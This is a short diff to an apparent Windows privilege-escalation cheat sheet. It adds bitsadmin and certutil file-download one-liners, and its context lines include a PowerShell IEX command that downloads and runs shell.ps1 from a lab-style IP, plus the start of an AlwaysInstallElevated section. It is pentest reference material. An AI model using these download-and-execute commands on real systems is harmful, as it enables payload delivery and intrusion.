@@ -285,6 +285,18 @@ Invoke-WebRequest -Uri 'http://10.10.14.26/shell.ps1'-OutFile 'shell.ps1'
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.26/shell.ps1')
 ```
 
+#### **Using Bitsadmin**
+
+```text
+bitsadmin /transfer mydownloadjob /download /priority normal http:///$ip/$file C:\\Users\\%USERNAME%\\AppData\\local\\temp\\$file
+```
+
+**Using Certutil**
+
+```text
+certutil.exe -urlcache -split -f "http://$ip/$file" $file
+```
+
 ### **AlwaysInstall Elevated**
 
 Allows non-privileged users to run executables as `NT AUTHORITY\SYSTEM`.  To check for this, query the below key
